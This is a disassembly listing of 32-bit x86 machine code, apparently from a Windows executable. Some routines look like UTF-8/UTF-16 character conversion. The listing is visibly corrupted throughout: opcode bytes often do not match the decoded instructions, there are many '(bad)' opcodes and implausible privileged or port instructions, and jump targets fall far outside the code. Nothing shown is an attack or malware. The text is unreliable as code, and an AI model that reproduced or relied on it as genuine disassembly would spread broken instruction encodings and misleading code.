  40a81f:	2f                   	das
  40a820:	00 00                	add    %al,(%eax)
  40a822:	83 f8 05             	cmp    $0x5,%eax
  40a825:	75 55                	jne    0x40a87c
  40a827:	ed                   	in     (%dx),%eax
  40a828:	00 08                	add    %cl,(%eax)
  40a82a:	41                   	inc    %ecx
  40a82b:	00 85 61 a0 1e 85    	add    %al,-0x7ae15f9f(%ebp)
  40a831:	c9                   	leave
  40a832:	75 0a                	jne    0x40a83e
  40a834:	b8 32 00 00 00       	mov    $0x32,%eax
  40a839:	e9 d8 96 8b 00       	jmp    0xcc3f16
  40a83e:	33 c0                	xor    %eax,%eax
  40a840:	83 db 04             	sbb    $0x4,%ebx
  40a843:	0f 95 08             	setne  (%eax)
  40a846:	ba c0 33 e9 c8       	mov    $0xc8e933c0,%edx
  40a84b:	7d 00                	jge    0x40a84d
  40a84d:	42                   	inc    %edx
  40a84e:	f4                   	hlt
  40a84f:	f8                   	clc
  40a850:	02 75 0a             	add    0xa(%ebp),%dh
  40a853:	b8 6c 00 00 00       	mov    $0x6c,%eax
  40a858:	e9 b9 00 e0 00       	jmp    0x120a916
  40a85d:	83 f9 01             	cmp    $0x1,%ecx
  40a860:	73 0a                	jae    0x40a86c
  40a862:	b8 3c 00 00 96       	mov    $0x9600003c,%eax
  40a867:	e9 69 00 00 00       	jmp    0x40a8d5
  40a86c:	f6 c0 83             	test   $0x83,%al
  40a86f:	fd                   	std
  40a870:	01 0f                	add    %ecx,(%edi)
  40a872:	95                   	xchg   %eax,%ebp
  40a873:	c0 99 c0 d6 e9 3a 00 	rcrb   $0x0,0x3ae9d6c0(%ecx)
  40a87a:	00 00                	add    %al,(%eax)
  40a87c:	83 e8 06             	sub    $0x6,%eax
  40a87f:	f7 d8                	neg    %eax
  40a881:	64 c0 24 ec 83       	shlb   $0x83,%fs:(%esp,%ebp,8)
  40a886:	c0 50 e9 89          	rclb   $0x89,-0x17(%eax)
  40a88a:	00 00                	add    %al,(%eax)
  40a88c:	00 83 f8 01 75 7f    	add    %al,0x7f7501f8(%ebx)
  40a892:	a0 0c 08 11 00       	mov    0x11080c,%al
  40a897:	be 0c 08 41 00       	mov    $0x41080c,%esi
  40a89c:	84 c0                	test   %al,%al
  40a89e:	4c                   	dec    %esp
  40a89f:	3b 8b 2a 68 c1 40    	cmp    0x40c1682a(%ebx),%ecx
  40a8a5:	00 a1 74 c1 2a 00    	add    %ah,0x2ac174(%ecx)
  40a8ab:	06                   	push   %es
  40a8ac:	38 40 7e             	cmp    %al,0x7e(%eax)
  40a8af:	0e                   	push   %cs
  40a8b0:	33 c9                	xor    %ecx,%ecx
  40a8b2:	6a 01                	push   $0x1
  40a8b4:	8a 0e                	mov    (%esi),%cl
  40a8b6:	51                   	push   %ecx
  40a8b7:	ff d7                	call   *%edi
  40a8b9:	83 86 08 eb e3 a1 78 	addl   $0x78,-0x5e1c14f8(%esi)
  40a8c0:	fa                   	cli
  40a8c1:	40                   	inc    %eax
  40a8c2:	00 84 d2 8a 16 8b 08 	add    %al,0x88b168a(%edx,%edx,8)
  40a8c9:	8a 04 07             	mov    (%edi,%eax,1),%al
  40a8cc:	83 a6 78 85 c0 56 08 	andl   $0x8,0x56c08578(%esi)
  40a8d3:	8a 46 59             	mov    0x59(%esi),%al
  40a8d6:	46                   	inc    %esi
  40a8d7:	e8 c0 75 cb 0b       	call   0xc0c1e9c
  40a8dc:	00 08                	add    %cl,(%eax)
  40a8de:	41                   	inc    %ecx
  40a8df:	00 83 f8 0a d3 10    	add    %al,0x10d30af8(%ebx)
  40a8e5:	8a 2f                	mov    (%edi),%ch
  40a8e7:	cd c0                	int    $0xc0
  40a8e9:	80 f9 43             	cmp    $0x43,%cl
  40a8ec:	0f 9d c0             	setge  %al
  40a8ef:	8d 44 8b 0a          	lea    0xa(%ebx,%ecx,4),%eax
  40a8f3:	3b 21                	cmp    (%ecx),%esp
  40a8f5:	83 f8 cb             	cmp    $0xffffffcb,%eax
  40a8f8:	73 33                	jae    0x40a92d
  40a8fa:	8a 0e                	mov    (%esi),%cl
  40a8fc:	33 c0                	xor    %eax,%eax
  40a8fe:	80 f9 41             	cmp    $0x41,%cl
  40a901:	0f 9d c0             	setge  %al
  40a904:	8d 44 00 0e          	lea    0xe(%eax,%eax,1),%eax
  40a908:	eb 30                	jmp    0x40a93a
  40a90a:	b8 12 00 00 00       	mov    $0x12,%eax
  40a90f:	eb 05                	jmp    0x40a916
  40a911:	b8 34 00 00 00       	mov    $0x34,%eax
  40a916:	a3 dc 57 53 00       	mov    %eax,0x5357dc
  40a91b:	eb 55                	jmp    0x40a972
  40a91d:	0b 95 92 02 8b 35    	or     0x358b0292(%ebp),%edx
  40a923:	f5                   	cmc
  40a924:	76 41                	jbe    0x40a967
  40a926:	00 33                	add    %dh,(%ebx)
  40a928:	c0 83 fe 01 0f b4 c0 	rolb   $0xc0,-0x4bf0fe02(%ebx)
  40a92f:	48                   	dec    %eax
  40a930:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a931:	25 2e 4e 00 00       	and    $0x4e2e,%eax
  40a936:	5d                   	pop    %ebp
  40a937:	c3                   	ret
  40a938:	90                   	nop
  40a939:	90                   	nop
  40a93a:	47                   	inc    %edi
  40a93b:	90                   	nop
  40a93c:	90                   	nop
  40a93d:	90                   	nop
  40a93e:	b1 90                	mov    $0x90,%cl
  40a940:	55                   	push   %ebp
  40a941:	8b 7c 8b 45          	mov    0x45(%ebx,%ecx,4),%edi
  40a945:	08 56 8b             	or     %dl,-0x75(%esi)
  40a948:	0c 85                	or     $0x85,%al
  40a94a:	e4 08                	in     $0x8,%al
  40a94c:	41                   	inc    %ecx
  40a94d:	00 8d 34 85 e4 08    	add    %cl,0x8e48534(%ebp)
  40a953:	63 fe                	arpl   %edi,%esi
  40a955:	85 0d 75 17 65 10    	test   %ecx,0x10651775
  40a95b:	85 f4                	test   %esi,%esp
  40a95d:	c4 40 00             	les    0x0(%eax),%eax
  40a960:	50                   	push   %eax
  40a961:	ff 15 18 c0 d7 00    	call   *0xd7c018
  40a967:	85 c0                	test   %eax,%eax
  40a969:	89 06                	mov    %eax,(%esi)
  40a96b:	75 11                	jne    0x40a97e
  40a96d:	5e                   	pop    %esi
  40a96e:	5d                   	pop    %ebp
  40a96f:	c3                   	ret
  40a970:	8b 3d 10 85 74 b3    	mov    0xb3748510,%edi
  40a976:	0d 8b 0e 50 51       	or     $0x51500e8b,%eax
  40a97b:	41                   	inc    %ecx
  40a97c:	15 1c ba 40 00       	adc    $0x40ba1c,%eax
  40a981:	16                   	push   %ss
  40a982:	23 c3                	and    %ebx,%eax
  40a984:	8b 55 0c             	mov    0xc(%ebp),%edx
  40a987:	8b 06                	mov    (%esi),%eax
  40a989:	52                   	push   %edx
  40a98a:	65 ff 15 1c c0 40 1d 	call   *%gs:0x1d40c01c
  40a991:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a992:	4d                   	dec    %ebp
  40a993:	00 1e                	add    %bl,(%esi)
  40a995:	90                   	nop
  40a996:	90                   	nop
  40a997:	90                   	nop
  40a998:	90                   	nop
  40a999:	90                   	nop
  40a99a:	90                   	nop
  40a99b:	90                   	nop
  40a99c:	90                   	nop
  40a99d:	90                   	nop
  40a99e:	90                   	nop
  40a99f:	90                   	nop
  40a9a0:	55                   	push   %ebp
  40a9a1:	8b 81 99 ec 14 53    	mov    0x5314ec99(%ecx),%eax
  40a9a7:	56                   	push   %esi
  40a9a8:	57                   	push   %edi
  40a9a9:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a9ac:	8b 3e                	mov    (%esi),%edi
  40a9ae:	85 d2                	test   %edx,%edx
  40a9b0:	89 55 d3             	mov    %edx,-0x2d(%ebp)
  40a9b3:	75 0e                	jne    0x40a9c3
  40a9b5:	5f                   	pop    %edi
  40a9b6:	5d                   	pop    %ebp
  40a9b7:	33 c0                	xor    %eax,%eax
  40a9b9:	5b                   	pop    %ebx
  40a9ba:	8b e5                	mov    %ebp,%esp
  40a9bc:	5d                   	pop    %ebp
  40a9bd:	c2 10 00             	ret    $0x10
  40a9c0:	0c bd                	or     $0xbd,%al
  40a9c2:	df 8b 4d 63 83 39    	fisttps 0x3983634d(%ebx)
  40a9c8:	00 74 ea 8b          	add    %dh,-0x75(%edx,%ebp,8)
  40a9cc:	75 08                	jne    0x40a9d6
  40a9ce:	33 c0                	xor    %eax,%eax
  40a9d0:	8a 06                	mov    (%esi),%al
  40a9d2:	46                   	inc    %esi
  40a9d3:	84 c0                	test   %al,%al
  40a9d5:	89 e2                	mov    %esp,%edx
  40a9d7:	08 78 e7             	or     %bh,-0x19(%eax)
  40a9da:	4a                   	dec    %edx
  40a9db:	05 17 7f 11 4a       	add    $0x4a117f17,%eax
  40a9e0:	89 70 8b             	mov    %esi,-0x75(%eax)
  40a9e3:	4d                   	dec    %ebp
  40a9e4:	10 66 b6             	adc    %ah,-0x4a(%esi)
  40a9e7:	01 83 c1 50 64 4d    	add    %eax,0x4d6450c1(%ebx)
  40a9ed:	10 e9                	adc    %ch,%cl
  40a9ef:	c8 01 00 12          	enter  $0x1,$0x12
  40a9f3:	31 c8                	xor    %ecx,%eax
  40a9f5:	81 e1 c0 00 00 7f    	and    $0x7f0000c0,%ecx
  40a9fb:	80 f9 c0             	cmp    $0xc0,%cl
  40a9fe:	0f 85 87 00 ae 00    	jne    0xeeaa8b
  40aa04:	99                   	cltd
  40aa05:	e2 e0                	loop   0x40a9e7
  40aa07:	00 00                	add    %al,(%eax)
  40aa09:	00 8b c8 89 66 f0    	add    %cl,-0xf997638(%ebx)
  40aa0f:	23 cf                	and    %edi,%ecx
  40aa11:	33 db                	xor    %ebx,%ebx
  40aa13:	be 01 4b 00 9e       	mov    $0x9e004b01,%esi
  40aa18:	33 d2                	xor    %edx,%edx
  40aa1a:	27                   	daa
  40aa1b:	cf                   	iret
  40aa1c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40aa1f:	53                   	push   %ebx
  40aa20:	45                   	inc    %ebp
  40aa21:	d3 75 34             	shll   %cl,0x34(%ebp)
  40aa24:	3b d3                	cmp    %ebx,%edx
  40aa26:	f0 30 8b c7 8b d8 c1 	lock xor %cl,-0x3e277439(%ebx)
  40aa2d:	08 00                	or     %al,(%eax)
  40aa2f:	00 00                	add    %al,(%eax)
  40aa31:	e8 da a9 93 00       	call   0xd45410
  40aa36:	0b f8                	or     %eax,%edi
  40aa38:	0b da                	or     %edx,%ebx
  40aa3a:	46                   	inc    %esi
  40aa3b:	4f                   	dec    %edi
  40aa3c:	fe 03                	incb   (%ebx)
  40aa3e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40aa41:	77 48                	ja     0x40aa8b
  40aa43:	d2 e6                	shl    %cl,%dh
  40aa45:	ec                   	in     (%dx),%al
  40aa46:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa49:	23 c7                	and    %edi,%eax
  40aa4b:	23 cb                	and    %ebx,%ecx
  40aa4d:	3b c7                	cmp    %edi,%eax
  40aa4f:	75 04                	jne    0x40aa55
  40aa51:	3b 67 74             	cmp    0x74(%edi),%esp
  40aa54:	d3 8b 45 ec 8b 25    	rorl   %cl,0x258bec45(%ebx)
  40aa5a:	f0 c1 cb f7          	lock ror $0xf7,%ebx
  40aa5e:	d1 aa f7 23 ca 8b    	shrl   $1,-0x7435dc09(%edx)
  40aa64:	55                   	push   %ebp
  40aa65:	99                   	cltd
  40aa66:	c5 d6 23             	(bad)
  40aa69:	f0 8d 16             	lock lea (%esi),%edx
  40aa6c:	01 89 45 f4 dc 45    	add    %ecx,0x45dcf445(%ecx)
  40aa72:	ca 8b a8             	lret   $0xa88b
  40aa75:	0f 86 59 8d 94 00    	jbe    0xd537d4
  40aa7b:	83 fa 01             	cmp    $0x1,%edx
  40aa7e:	8b c6                	mov    %esi,%eax
  40aa80:	75 17                	jne    0x40aa99
  40aa82:	83 e0 1e             	and    $0x1e,%eax
  40aa85:	33 ff                	xor    %edi,%edi
  40aa87:	0b c7                	or     %edi,%eax
  40aa89:	75 67                	jne    0x40aaf2
  40aa8b:	5f                   	pop    %edi
  40aa8c:	5e                   	pop    %esi
  40aa8d:	b8 be 00 00 da       	mov    $0xda0000be,%eax
  40aa92:	fd                   	std
  40aa93:	8b e5                	mov    %ebp,%esp
  40aa95:	5d                   	pop    %ebp
  40aa96:	44                   	inc    %esp
  40aa97:	c4 00                	les    (%eax),%eax
  40aa99:	0b c1                	or     %ecx,%eax
  40aa9b:	75 1e                	jne    0x40aabb
  40aa9d:	3c 55                	cmp    $0x55,%al
  40aa9f:	4b                   	dec    %ebx
  40aaa0:	0f a4 fb 01          	shld   $0x1,%edi,%ebx
  40aaa4:	8a 02                	mov    (%edx),%al
  40aaa6:	03 ff                	add    %edi,%edi
  40aaa8:	24 99                	and    $0x99,%al
  40aaaa:	b5 ff                	mov    $0xff,%ch
  40aaac:	00 2d 06 99 23 c7    	add    %ch,0xc7239906
  40aab2:	23 5b 0b             	and    0xb(%ebx),%ebx
  40aab5:	c2 74 d3             	ret    $0xd374
  40aab8:	1a 55 fc             	sbb    -0x4(%ebp),%dl
  40aabb:	83 fa f8             	cmp    $0xfffffff8,%edx
  40aabe:	9f                   	lahf
  40aabf:	6c                   	insb   (%dx),%es:(%edi)
  40aac0:	83 fe 0d             	cmp    $0xd,%esi
  40aac3:	81 2d 85 c9 75 29 8b 	subl   $0xffdb458b,0x2975c985
  40aaca:	45 db ff 
  40aacd:	00 20                	add    %ah,(%eax)
  40aacf:	eb 1f                	jmp    0x40aaf0
  40aad1:	83 fa 03             	cmp    $0x3,%edx
  40aad4:	75 1c                	jne    0x40aaf2
  40aad6:	d8 c9                	fmul   %st(1),%st
  40aad8:	a8 b1                	test   $0xb1,%al
  40aada:	7c 05                	jl     0x40aae1
  40aadc:	83 fe 04             	cmp    $0x4,%esi
  40aadf:	77 aa                	ja     0x40aa8b
  40aae1:	83 91 74 75 0c 85 71 	adcl   $0x71,-0x7af38a8c(%ecx)
  40aae8:	75 08                	jne    0x40aaf2
  40aaea:	8b 45 08             	mov    0x8(%ebp),%eax
  40aaed:	f6 00 30             	testb  $0x30,(%eax)
  40aaf0:	75 e8                	jne    0x40aada
  40aaf2:	8b 7d 14             	mov    0x14(%ebp),%edi
  40aaf5:	b8 9b 00 6b 25       	mov    $0x256b009b,%eax
  40aafa:	3b c2                	cmp    %edx,%eax
  40aafc:	8b 1f                	mov    (%edi),%ebx
  40aafe:	1b c0                	sbb    %eax,%eax
  40ab00:	d6                   	salc
  40ab01:	d8 40 3b             	fadds  0x3b(%eax)
  40ab04:	d8 0f                	fmuls  (%edi)
  40ab06:	82 20 fe             	andb   $0xfe,(%eax)
  40ab09:	ff 40 65             	incl   0x65(%eax)
  40ab0c:	2a 74 3f 8b          	sub    -0x75(%edi,%edi,1),%dh
  40ab10:	7d 08                	jge    0x40ab1a
  40ab12:	eb 11                	jmp    0x40ab25
  40ab14:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ab17:	33 b0 b6 8a 07 89    	xor    -0x76f8754a(%eax),%esi
  40ab1d:	55                   	push   %ebp
  40ab1e:	fc                   	cld
  40ab1f:	8b d0                	mov    %eax,%edx
  40ab21:	81 e2 c0 00 00 00    	and    $0xc0,%edx
  40ab27:	47                   	inc    %edi
  40ab28:	80 fa 76             	cmp    $0x76,%dl
  40ab2b:	89 7d 08             	mov    %edi,0x8(%ebp)
  40ab2e:	0f f5 1c ff          	pmaddwd (%edi,%edi,8),%mm3
  40ab32:	ff                   	(bad)
  40ab33:	3c 2d                	cmp    $0x2d,%al
  40ab35:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40ab36:	27                   	daa
  40ab37:	06                   	push   %es
  40ab38:	83 e0 3f             	and    $0x3f,%eax
  40ab3b:	99                   	cltd
  40ab3c:	c1 e6 06             	shl    $0x6,%esi
  40ab3f:	0b c6                	or     %esi,%eax
  40ab41:	f9                   	stc
  40ab42:	c3                   	ret
  40ab43:	21 f0                	and    %esi,%eax
  40ab45:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ab48:	85 c0                	test   %eax,%eax
  40ab4a:	8b ca                	mov    %edx,%ecx
  40ab4c:	75 c6                	jne    0x40ab14
  40ab4e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40ab51:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40ab54:	2b 20                	sub    (%eax),%esp
  40ab56:	8b af 0c a0 c9 89    	mov    -0x76365ff4(%edi),%ebp
  40ab5c:	02 7f 17             	add    0x17(%edi),%bh
  40ab5f:	7c 08                	jl     0x40ab69
  40ab61:	81 fe 7d 00 b1 00    	cmp    $0xb1007d,%esi
  40ab67:	46                   	inc    %esi
  40ab68:	0d 8b a7 14 8b       	or     $0x8b14a78b,%eax
  40ab6d:	10 93 89 10 21 f8    	adc    %dl,-0x7deef77(%ebx)
  40ab73:	e0 eb                	loopne 0x40ab60
  40ab75:	3c 8b                	cmp    $0x8b,%al
  40ab77:	45                   	inc    %ebp
  40ab78:	14 8b                	adc    $0x8b,%al
  40ab7a:	2a 83 c3 fe 81 1b    	sub    0x1b81fec3(%ebx),%al
  40ab80:	00 00                	add    %al,(%eax)
  40ab82:	ce                   	into
  40ab83:	ff 83 d1 ff 89 18    	incl   0x1889ffd1(%ebx)
  40ab89:	8b d1                	mov    %ecx,%edx
  40ab8b:	8b 72 b9             	mov    -0x47(%edx),%esi
  40ab8e:	0a 00                	or     (%eax),%al
  40ab90:	f3 00 e8             	repz add %ch,%al
  40ab93:	79 0c                	jns    0x40aba1
  40ab95:	2d 00 66 b9 c8       	sub    $0xc8b96600,%eax
  40ab9a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40ab9d:	80 cd d8             	or     $0xd8,%ch
  40aba0:	b6 e6                	mov    $0xe6,%dh
  40aba2:	ff 03                	incl   (%ebx)
  40aba4:	00 00                	add    %al,(%eax)
  40aba6:	66 89 08             	mov    %cx,(%eax)
  40aba9:	83 3a 02             	cmpl   $0x2,(%edx)
  40abac:	81 ce 00 dc 00 00    	or     $0xdc00,%esi
  40abb2:	66 89 e9             	mov    %bp,%cx
  40abb5:	83 c0 02             	add    $0x2,%eax
  40abb8:	89 45 10             	mov    %eax,0x10(%ebp)
  40abbb:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40abbe:	8b 30                	mov    (%eax),%esi
  40abc0:	6c                   	insb   (%dx),%es:(%edi)
  40abc1:	c0 89 45 f8 0f 85 f5 	rorb   $0xf5,-0x7af007bb(%ecx)
  40abc8:	fd                   	std
  40abc9:	ff                   	(bad)
  40abca:	ff 5f 5e             	lcall  *0x5e(%edi)
  40abcd:	5b                   	pop    %ebx
  40abce:	8b e5                	mov    %ebp,%esp
  40abd0:	5d                   	pop    %ebp
  40abd1:	c2 c8 00             	ret    $0xc8
  40abd4:	91                   	xchg   %eax,%ecx
  40abd5:	e7 b8                	out    %eax,$0xb8
  40abd7:	16                   	push   %ss
  40abd8:	11 01                	adc    %eax,(%ecx)
  40abda:	68 5b 8b e5 5d       	push   $0x5de58b5b
  40abdf:	c2 10 00             	ret    $0x10
  40abe2:	90                   	nop
  40abe3:	90                   	nop
  40abe4:	b8 90 90 90 90       	mov    $0x90909090,%eax
  40abe9:	90                   	nop
  40abea:	90                   	nop
  40abeb:	90                   	nop
  40abec:	90                   	nop
  40abed:	90                   	nop
  40abee:	90                   	nop
  40abef:	90                   	nop
  40abf0:	55                   	push   %ebp
  40abf1:	8b ec                	mov    %esp,%ebp
  40abf3:	83 ec 08             	sub    $0x8,%esp
  40abf6:	40                   	inc    %eax
  40abf7:	55                   	push   %ebp
  40abf8:	0c 53                	or     $0x53,%al
  40abfa:	56                   	push   %esi
  40abfb:	57                   	push   %edi
  40abfc:	c0 3a 85             	sarb   $0x85,(%edx)
  40abff:	ff 89 8f fc 75 a6    	decl   -0x598a0371(%ecx)
  40ac05:	5f                   	pop    %edi
  40ac06:	5e                   	pop    %esi
  40ac07:	33 c0                	xor    %eax,%eax
  40ac09:	5b                   	pop    %ebx
  40ac0a:	8b e5                	mov    %ebp,%esp
  40ac0c:	5d                   	pop    %ebp
  40ac0d:	c7                   	(bad)
  40ac0e:	10 00                	adc    %al,(%eax)
  40ac10:	95                   	xchg   %eax,%ebp
  40ac11:	7d fc                	jge    0x40ac0f
  40ac13:	8b b0 14 83 38 4b    	mov    0x4b388314(%eax),%esi
  40ac19:	74 ea                	je     0x40ac05
  40ac1b:	8b 3a                	mov    (%edx),%edi
  40ac1d:	71 33                	jno    0x40ac52
  40ac1f:	0f 97 20             	seta   (%eax)
  40ac22:	0e                   	push   %cs
  40ac23:	0b c6                	or     %esi,%eax
  40ac25:	02 81 f9 80 82 cf    	add    -0x307d7f07(%ecx),%al
  40ac2b:	ba 89 8f 08 36       	mov    $0x36088f89,%edx
  40ac30:	16                   	push   %ss
  40ac31:	4f                   	dec    %edi
  40ac32:	89 00                	mov    %eax,(%eax)
  40ac34:	8b 30                	mov    (%eax),%esi
  40ac36:	4e                   	dec    %esi
  40ac37:	89 30                	mov    %esi,(%eax)
  40ac39:	8b 92 10 88 0d 40    	mov    0x400d8810(%edx),%edx
  40ac3f:	89 45 10             	mov    %eax,0x10(%ebp)
  40ac42:	e9 68 e3 00 00       	jmp    0x418faf
  40ac47:	8b c1                	mov    %ecx,%eax
  40ac49:	25 34 fc 00 00       	and    $0xfc34,%eax
  40ac4e:	3d 00 dc 88 00       	cmp    $0x88dc00,%eax
  40ac53:	0f 84 1c 01 00 00    	je     0x40ad75
  40ac59:	3d 00 47 00 bd       	cmp    $0xbd004700,%eax
  40ac5e:	75 46                	jne    0x40aca6
  40ac60:	83 ff 02             	cmp    $0x2,%edi
  40ac63:	0f 82 9b 00 00 00    	jb     0x40ad04
  40ac69:	66 8b 06             	mov    (%esi),%ax
  40ac6c:	8b d0                	mov    %eax,%edx
  40ac6e:	81 e2 00 fc 00 00    	and    $0xfc00,%edx
  40ac74:	81 fa 00 dc 00 00    	cmp    $0xdc00,%edx
  40ac7a:	67 85 f5             	addr16 test %esi,%ebp
  40ac7d:	00 00                	add    %al,(%eax)
  40ac7f:	00 b6 e1 ff 03 00    	add    %dh,0x3ffe1(%esi)
  40ac85:	00 25 ff 28 00 00    	add    %ah,0x28ff
  40ac8b:	fc                   	cld
  40ac8c:	23 9f 0b 5d 83 7c    	and    0x7c835d0b(%edi),%ebx
  40ac92:	02 99 47 d8 8b fa    	add    -0x57427b9(%ecx),%bl
  40ac98:	81 c3 00 00 01 00    	add    $0x10000,%ebx
  40ac9e:	06                   	push   %es
  40ac9f:	75 08                	jne    0x40aca9
  40aca1:	83 d7 00             	adc    $0x0,%edi
  40aca4:	eb 07                	jmp    0x40acad
  40aca6:	8b c1                	mov    %ecx,%eax
  40aca8:	99                   	cltd
  40aca9:	ad                   	lods   %ds:(%esi),%eax
  40acaa:	c3                   	ret
  40acab:	8b 51 87             	mov    -0x79(%ecx),%edx
  40acae:	c3                   	ret
  40acaf:	8b d7                	mov    %edi,%edx
  40acb1:	b9 0b 2f 00 00       	mov    $0x2f0b,%ecx
  40acb6:	e8 55 0b 00 00       	call   0x40b810
  40acbb:	8b c8                	mov    %eax,%ecx
  40acbd:	be 01 24 00 e6       	mov    $0xe6002401,%esi
  40acc2:	0b 77 74             	or     0x74(%edi),%esi
  40acc5:	11 7b 05             	adc    %edi,0x5(%ebx)
  40acc8:	00 16                	add    %dl,(%esi)
  40acca:	00 e8                	add    %ch,%al
  40accc:	40                   	inc    %eax
  40accd:	0b 18                	or     (%eax),%ebx
  40accf:	00 42 c8             	add    %al,-0x38(%edx)
  40acd2:	46                   	inc    %esi
  40acd3:	02 ca                	add    %dl,%cl
  40acd5:	75 ef                	jne    0x40acc6
  40acd7:	8b 55 c3             	mov    -0x3d(%ebp),%edx
  40acda:	3b 32                	cmp    (%edx),%esi
  40acdc:	0f 83 a9 ff 76 ff    	jae    0xffb7ac8b
  40ace2:	b8 02 00 00 00       	mov    $0x2,%eax
  40ace7:	8b 55 96             	mov    -0x6a(%ebp),%edx
  40acea:	3b c6                	cmp    %esi,%eax
  40acec:	8b 45 a7             	mov    -0x59(%ebp),%eax
  40acef:	1b 17                	sbb    (%edi),%edx
  40acf1:	f7 d9                	neg    %ecx
  40acf3:	2b c1                	sub    %ecx,%eax
  40acf5:	83 c9 ff             	or     $0xffffffff,%ecx
  40acf8:	48                   	dec    %eax
  40acf9:	83 ce 89             	or     $0xffffff89,%esi
  40acfc:	c1 89 45 8a 8b 10 03 	rorl   $0x3,0x108b8a45(%ecx)
  40ad03:	d1 89 35 8b 55 10    	rorl   $1,0x10558b35(%ecx)
  40ad09:	cf                   	iret
  40ad0a:	41                   	inc    %ecx
  40ad0b:	8d 57 32             	lea    0x32(%edi),%edx
  40ad0e:	01 a5 80 00 00 00    	add    %esp,0x80(%ebp)
  40ad14:	89 4d 69             	mov    %ecx,0x69(%ebp)
  40ad17:	10 30                	adc    %dh,(%eax)
  40ad19:	46                   	inc    %esi
  40ad1a:	96                   	xchg   %eax,%esi
  40ad1b:	d1 fa                	sar    $1,%edx
  40ad1d:	bd c2 49 89 45       	mov    $0x458949c2,%ebp
  40ad22:	cf                   	iret
  40ad23:	8a c3                	mov    %bl,%al
  40ad25:	24 3f                	and    $0x3f,%al
  40ad27:	ae                   	scas   %es:(%edi),%al
  40ad28:	66 f8                	data16 clc
  40ad2a:	0c 80                	or     $0x80,%al
  40ad2c:	8b d7                	mov    %edi,%edx
  40ad2e:	88 01                	mov    %al,(%ecx)
  40ad30:	3c 60                	cmp    $0x60,%al
  40ad32:	b9 06 00 00 00       	mov    $0x6,%ecx
  40ad37:	e8 d4 0a 00 16       	call   0x1640b810
  40ad3c:	b1 4d                	mov    $0x4d,%cl
  40ad3e:	f8                   	clc
  40ad3f:	8b d8                	mov    %eax,%ebx
  40ad41:	8b 60 fc             	mov    -0x4(%eax),%esp
  40ad44:	4e                   	dec    %esi
  40ad45:	8b fa                	mov    %edx,%edi
  40ad47:	75 c2                	jne    0x40ad0b
  40ad49:	8b 0b                	mov    (%ebx),%ecx
  40ad4b:	80 97 d8 88 59 ff 82 	adcb   $0x82,-0xa67728(%edi)
  40ad52:	02 52 c0             	add    -0x40(%edx),%dl
  40ad55:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40ad58:	0f 85 b2 fe 89 ff    	jne    0xffcaac10
  40ad5e:	5f                   	pop    %edi
  40ad5f:	5e                   	pop    %esi
  40ad60:	5b                   	pop    %ebx
  40ad61:	8b e5                	mov    %ebp,%esp
  40ad63:	5d                   	pop    %ebp
  40ad64:	c2 10 df             	ret    $0xdf10
  40ad67:	5f                   	pop    %edi
  40ad68:	4d                   	dec    %ebp
  40ad69:	b8 8a 11 01 c4       	mov    $0xc401118a,%eax
  40ad6e:	e2 8b                	loop   0x40acfb
  40ad70:	90                   	nop
  40ad71:	5d                   	pop    %ebp
  40ad72:	c2 a7 00             	ret    $0xa7
  40ad75:	5f                   	pop    %edi
  40ad76:	5e                   	pop    %esi
  40ad77:	b8 16 00 75 00       	mov    $0x750016,%eax
  40ad7c:	5b                   	pop    %ebx
  40ad7d:	8b e5                	mov    %ebp,%esp
  40ad7f:	5d                   	pop    %ebp
  40ad80:	c2 7a 00             	ret    $0x7a
  40ad83:	2d 90 90 90 90       	sub    $0x90909090,%eax
  40ad88:	1a 90 90 90 90 90    	sbb    -0x6f6f6f70(%eax),%dl
  40ad8e:	90                   	nop
  40ad8f:	ba 55 8e ec 8b       	mov    $0x8bec8e55,%edx
  40ad94:	45                   	inc    %ebp
  40ad95:	08 83 e8 5b b8 10    	or     %al,0x10b85be8(%ebx)
  40ad9b:	ff 15 2c c1 23 00    	call   *0x23c12c
  40ada1:	c7 00 3f 17 00 4a    	movl   $0x4a00173f,(%eax)
  40ada7:	33 aa 5d c3 8b bf    	xor    -0x40743ca3(%edx),%ebp
  40adad:	14 8b                	adc    $0x8b,%al
  40adaf:	4d                   	dec    %ebp
  40adb0:	10 6b 55             	adc    %ch,0x55(%ebx)
  40adb3:	2d 50 4c 52 e8       	sub    $0xe8524c50,%eax
  40adb8:	14 00                	adc    $0x0,%al
  40adba:	00 00                	add    %al,(%eax)
  40adbc:	83 c4 0c             	add    $0xc,%esp
  40adbf:	5d                   	pop    %ebp
  40adc0:	8e 0a                	mov    (%edx),%cs
  40adc2:	90                   	nop
  40adc3:	90                   	nop
  40adc4:	90                   	nop
  40adc5:	90                   	nop
  40adc6:	e5 90                	in     $0x90,%eax
  40adc8:	90                   	nop
  40adc9:	48                   	dec    %eax
  40adca:	90                   	nop
  40adcb:	90                   	nop
  40adcc:	90                   	nop
  40adcd:	dd 90 87 55 8b ec    	fstl   -0x1374aa79(%eax)
  40add3:	8b 45 10             	mov    0x10(%ebp),%eax
  40add6:	ed                   	in     (%dx),%eax
  40add7:	4d                   	dec    %ebp
  40add8:	0c 83                	or     $0x83,%al
  40adda:	4d                   	dec    %ebp
  40addb:	10 73 10             	adc    %dh,0x10(%ebx)
  40adde:	36 15 2c c1 8f 00    	ss adc $0x8fc12c,%eax
  40ade4:	c7                   	(bad)
  40ade5:	a3 1c 00 00 00       	mov    %eax,0x1c
  40adea:	33 c0                	xor    %eax,%eax
  40adec:	69 c3 53 56 8b 75    	imul   $0x758b5653,%ebx,%eax
  40adf2:	08 57 bf             	or     %dl,-0x41(%edi)
  40adf5:	04 4a                	add    $0x4a,%al
  40adf7:	00 00                	add    %al,(%eax)
  40adf9:	75 06                	jne    0x40ae01
  40adfb:	15 3c 63 df 45       	adc    $0x45df633c,%eax
  40ae00:	10 76 74             	adc    %dh,0x74(%esi)
  40ae03:	f8                   	clc
  40ae04:	45                   	inc    %ebp
